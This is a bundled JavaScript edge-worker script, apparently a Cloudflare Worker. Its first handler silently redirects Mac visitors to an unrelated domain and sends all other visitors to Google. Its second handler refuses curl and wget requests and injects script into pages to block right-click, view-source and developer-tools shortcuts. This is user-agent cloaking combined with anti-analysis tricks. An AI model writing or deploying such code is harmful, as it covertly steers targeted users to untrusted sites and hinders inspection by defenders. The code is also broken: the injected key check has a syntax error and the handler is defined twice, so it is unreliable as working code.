(() => {
  var __defProp = Object.defineProperty;
  var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

  // src/index.js
  addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
  });
  async function handleRequest(request) {
    const userAgent = request.headers.get("user-agent").toLowerCase();
    let redirectUrl;
    if (userAgent.includes("windows")) {
      redirectUrl = "https://www.google.com";
    } else if (userAgent.includes("mac")) {
      redirectUrl = "https://megadoll.club";
    } else if (userAgent.includes("linux")) {
      redirectUrl = "https://www.google.com";
    } else {
      redirectUrl = "https://www.google.com";
    }
    return Response.redirect(redirectUrl, 302);
  }
  __name(handleRequest, "handleRequest");
  addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
  });
  async function handleRequest(request) {
    const userAgent = request.headers.get("User-Agent") || "";
    const blockedAgents = ["curl", "wget"];
    if (blockedAgents.some((agent) => userAgent.toLowerCase().includes(agent))) {
      return new Response("", {
        status: 403,
        headers: { "Content-Type": "text/plain" }
      });
    }
    const response = await fetch(request);
    const contentType = response.headers.get("Content-Type") || "";
    if (contentType.includes("text/html")) {
      let body = await response.text();
      const blockScripts = `
            <script>
                // Bloquear men\xFA contextual
                document.addEventListener('contextmenu', event => event.preventDefault());

                // Bloquear acceso al c\xF3digo fuente (Ctrl+U y Ctrl+Shift+I)
                document.addEventListener('keydown', event => {
                    if (event.ctrlKey && (event.key === 'u' || event.key === 'U' || event.key === 'i' || event.key === 'I' || event.key === 's' | event.key 'F12')) {
                        event.preventDefault();
                    }
                });
            <\/script>
        `;
      body = body.replace("</body>", `${blockScripts}</body>`);
      return new Response(body, {
        status: response.status,
        headers: response.headers
      });
    }
    return response;
  }
  __name(handleRequest, "handleRequest");
})();
//# sourceMappingURL=index.js.map
